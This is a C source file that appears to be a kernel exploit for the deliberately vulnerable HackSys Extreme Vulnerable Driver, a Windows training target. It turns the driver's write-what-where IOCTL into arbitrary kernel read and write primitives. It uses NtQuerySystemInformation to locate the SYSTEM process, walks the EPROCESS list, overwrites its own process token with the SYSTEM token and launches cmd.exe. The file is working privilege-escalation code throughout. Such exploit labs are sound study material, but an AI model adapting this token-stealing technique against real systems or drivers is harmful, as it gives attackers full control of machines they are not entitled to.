#include <windows.h>
#include <stdint.h>
#include <stdio.h>


#define TriggerArbitraryWrite_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

// _EPROCESS offsets 
#define UniqueProcessId_off    0x440
#define ActiveProcessLinks_off 0x448
#define Token_off              0x4b8


/**
 * Required for defining NtQuerySystemInformation
 */
typedef struct _SYSTEM_HANDLE {
    ULONG       ProcessId;        
    BYTE        ObjectTypeNumber;
    BYTE        Flags;            
    USHORT      Handle;              
    PVOID       Object;          
    ACCESS_MASK GrantedAccess;    
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;            
    SYSTEM_HANDLE Handles[1];    
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);


typedef struct _WRITE_WHAT_WHERE
{  
	PULONG_PTR What;
  	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;



VOID arbitrary_write(HANDLE driver, uint64_t value, uint64_t addr){

	// Allcating space for payload structure on exploit.exe heap
	PWRITE_WHAT_WHERE payload = {HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WRITE_WHAT_WHERE))};
	
	// Notice &
	payload->What = (PULONG_PTR)&value;  
	payload->Where = (PULONG_PTR)addr;	
	
	DeviceIoControl(driver,TriggerArbitraryWrite_IOCTL,payload,sizeof(WRITE_WHAT_WHERE),NULL,0,0,NULL);
}


uint64_t arbitrary_read(HANDLE driver, uint64_t addr){

	PWRITE_WHAT_WHERE payload = {HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WRITE_WHAT_WHERE))};
	
	uint64_t result;

	payload->What = (PULONG_PTR)addr;  
	payload->Where = (PULONG_PTR)&result;		// Notice &	
	
	DeviceIoControl(driver,TriggerArbitraryWrite_IOCTL,payload,sizeof(WRITE_WHAT_WHERE),NULL,0,0,NULL);

	return result;
} 


/**
 * Used to find the base address of the sytem process 
 */ 
PVOID FindBaseAddress(DWORD pid) {

    HINSTANCE hNtDLL = LoadLibraryA("ntdll.dll");
    PSYSTEM_HANDLE_INFORMATION buffer;
    ULONG bufferSize = 0xffffff;
    buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
    NTSTATUS status;
    PVOID ProcAddress = NULL;

    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)(GetProcAddress(hNtDLL, "NtQuerySystemInformation"));

    status = NtQuerySystemInformation(0x10, buffer, bufferSize, NULL);

    for (ULONG i = 0; i <= buffer->HandleCount; i++) {
        if ((buffer->Handles[i].ProcessId == pid)) {
            ProcAddress = buffer->Handles[i].Object;
            break;
        }
    }

    free(buffer);
    return ProcAddress;
}


/**
 * Used to find our current process. Traverse EPROCESS list using our primitives starting from the system process
 */
PVOID LocateCurrentProc(HANDLE driver, PVOID SYSTEM) {

    DWORD pid = GetCurrentProcessId();
    DWORD curPid;
    PVOID current = SYSTEM;

    do {

        // Follow the next process link
        current = (PVOID)(arbitrary_read(driver, ((uint64_t)current + ActiveProcessLinks_off)) - ActiveProcessLinks_off);

        // Read the PID of 'current'
        curPid = (DWORD)arbitrary_read(driver, ((uint64_t)current + UniqueProcessId_off));

        if (curPid == pid) {
            break;
        }

    } while (current != SYSTEM);
    
	  if (current == SYSTEM) {
        return NULL;}

    return current;

}


int main(){

    
	HANDLE hHevd = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	  printf("* Driver handle: 0x%p\n", hHevd);    	

	uint64_t system_proc_base_addr  = (uint64_t)FindBaseAddress(4);
	uint64_t current_proc_base_addr = (uint64_t)LocateCurrentProc(hHevd, (PVOID)system_proc_base_addr);

	printf("+ System process base address : %p\n", system_proc_base_addr);
	printf("+ Current process base address: %p\n", current_proc_base_addr);

	uint64_t system_proc_token_addr  =  system_proc_base_addr + Token_off;
	uint64_t current_proc_token_addr =  current_proc_base_addr + Token_off;

	printf("* system token address:  %p\n", system_proc_token_addr);
	printf("* current token address: %p\n", current_proc_token_addr);

	uint64_t system_token = arbitrary_read(hHevd, system_proc_token_addr);
	arbitrary_write(hHevd, (uint64_t)system_token, current_proc_token_addr);

printf("+ Overwritten current process token with system token\n");

system("pause");
system("start cmd.exe");
}